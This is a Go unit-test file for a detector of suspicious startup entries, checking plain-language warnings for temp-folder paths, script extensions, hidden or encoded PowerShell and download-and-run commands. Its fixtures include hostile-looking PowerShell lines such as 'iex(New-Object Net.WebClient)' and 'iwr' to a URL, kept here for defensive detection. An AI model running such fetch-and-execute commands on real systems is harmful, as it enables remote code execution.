package startup

import "testing"

const (
	tempSentence = "This runs from a temporary folder, which is unusual for something that starts with the computer. Temporary folders are cleared, so a legitimate program does not install itself there."
	dlSentence   = "This runs from the Downloads folder. Installed software normally lives in Program Files or the user's AppData folder, not in Downloads."
	hiddenPS     = "This runs a hidden or scrambled PowerShell command. Legitimate software almost never needs to hide what it runs."
	fromNet      = "This downloads and runs something from the internet every time the computer starts."
	generated    = "The name looks randomly generated rather than chosen, which unwanted software often does so it is hard to search for."
	unreadable   = "CHIT could not read what this entry actually runs. Look at it in Task Manager or the registry."
)

func scriptSentence(ext string) string {
	return "This starts a " + ext + " script rather than a program. That is uncommon for normal software and is a favourite trick of unwanted software."
}

func TestConcern(t *testing.T) {
	tests := []struct {
		name    string
		item    string
		command string
		want    string
	}{
		// Rule 1: temporary folders.
		{"windows temp", "WinUpd", `C:\Users\j\AppData\Local\Temp\svc.exe`, tempSentence},
		{"unix tmp", "helper", "/tmp/thing", tempSentence},
		{"windows temp folder", "x", `C:\Windows\Temp\a.exe`, tempSentence},
		// A temp folder that is neither of the two well-known ones. Without
		// this row, dropping the generic \temp\ rule went unnoticed.
		{"a temp folder on another drive", "x", `D:\Temp\thing.exe`, tempSentence},
		{"a temp folder anywhere else", "x", `C:\ProgramData\Temp\x.exe`, tempSentence},
		{"quoted and uppercase", "x", `"C:\WINDOWS\TEMP\x.exe"`, tempSentence},
		{"forward slashes on windows", "x", `C:/Users/j/AppData/Local/Temp/a.exe`, tempSentence},

		// Rule 2: Downloads.
		{"windows downloads", "setup", `C:\Users\j\Downloads\setup.exe`, dlSentence},
		{"unix downloads", "setup", "/home/j/Downloads/setup", dlSentence},

		// Rule 3: script extensions.
		{"vbs", "x", `C:\Program Files\App\run.vbs`, scriptSentence("VBS")},
		{"js", "x", `C:\Program Files\App\run.js`, scriptSentence("JS")},
		{"jse", "x", `C:\App\run.jse`, scriptSentence("JSE")},
		{"vbe", "x", `C:\App\run.vbe`, scriptSentence("VBE")},
		{"wsf", "x", `C:\App\run.wsf`, scriptSentence("WSF")},
		{"hta", "x", `C:\App\run.hta`, scriptSentence("HTA")},
		{"scr", "x", `C:\App\run.scr`, scriptSentence("SCR")},
		{"pif", "x", `C:\App\run.pif`, scriptSentence("PIF")},
		{"uppercase extension still flags", "x", `C:\App\RUN.VBS`, scriptSentence("VBS")},
		{"an exe does not flag", "x", `C:\Program Files\App\run.exe`, ""},
		// A quoted path with an argument. Without unwrapping the quotes the
		// extension reads as `.vbs"` and the script rule never fires, which is
		// the normal shape of a Windows Run value.
		{"a quoted script with a switch", "x", `"C:\Program Files\App\run.vbs" /silent`, scriptSentence("VBS")},

		// Rule 4: hidden PowerShell.
		{"encoded", "x", "powershell -enc SQBFAFgA", hiddenPS},
		{"encodedcommand", "x", "powershell.exe -EncodedCommand SQBFAFgA", hiddenPS},
		{"hidden window", "x", `powershell -w hidden -c "Start-Process x"`, hiddenPS},
		{"invoke-expression", "x", "powershell -c iex(New-Object Net.WebClient)", hiddenPS},

		// Rule 5: downloads and runs. -nop is not one of the hiding flags, so
		// rule 4 does not catch these and rule 5 does.
		{"nop plus a url", "x", "powershell -nop -c iwr https://example.com/x", fromNet},
		{"noprofile plus a url without powershell", "x", "cscript -noprofile http://example.com/x", fromNet},

		// Rule 6: a generated-looking name.
		{"no vowels", "ntfsdrvsvc", `C:\Windows\System32\svchost.exe`, generated},
		{"all hex", "deadbeefcafe", `C:\Windows\System32\svchost.exe`, generated},
		{"seven characters is too short", "svchost", `C:\Windows\System32\svchost.exe`, ""},
		{"a normal name", "Dropbox", `C:\Program Files\Dropbox\Dropbox.exe`, ""},

		// Rule 7: nothing to read.
		{"no command at all", "Mystery", "", unreadable},
		{"whitespace only", "Mystery", "   ", unreadable},

		// Rule 8: ordinary software.
		{"a quoted program with a switch", "Dropbox", `"C:\Program Files\Dropbox\Dropbox.exe" /systemstartup`, ""},
		{"a linux applet", "nm-applet", "/usr/bin/nm-applet", ""},
		{"a systemd unit with no command", "sshd", "/usr/lib/systemd/systemd-sshd", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Concern(tt.item, tt.command); got != tt.want {
				t.Errorf("Concern(%q, %q) =\n%q\nwant\n%q", tt.item, tt.command, got, tt.want)
			}
		})
	}
}

func TestConcernFirstMatchWins(t *testing.T) {
	// A script in a temp folder trips two rules. The temp-folder sentence is
	// the more useful one and the order is what decides it.
	got := Concern("x", `C:\Users\j\AppData\Local\Temp\run.vbs`)
	if got != tempSentence {
		t.Errorf("Concern =\n%q\nwant the temporary-folder sentence, which is checked first", got)
	}
}

func TestConcernIgnoresAnArgumentThatLooksLikeAScript(t *testing.T) {
	// The extension test looks at the program, not at a switch that happens to
	// end in .js.
	if got := Concern("x", `C:\Program Files\node\node.exe /path/to/app.js`); got != "" {
		t.Errorf("Concern = %q, want nothing: the program is node.exe", got)
	}
}

func TestLooksGenerated(t *testing.T) {
	tests := []struct {
		in   string
		want bool
	}{
		{"ntfsdrvsvc", true},
		{"deadbeefcafe", true},
		{"abcdef01", true},
		{"svchost", false},
		{"Dropbox", false},
		{"OneDrive", false},
		{"short", false},
		{"", false},
		{"has spaces here", false},
		{"MicrosoftEdgeUpdate", false},
	}
	for _, tt := range tests {
		if got := looksGenerated(tt.in); got != tt.want {
			t.Errorf("looksGenerated(%q) = %v, want %v", tt.in, got, tt.want)
		}
	}
}
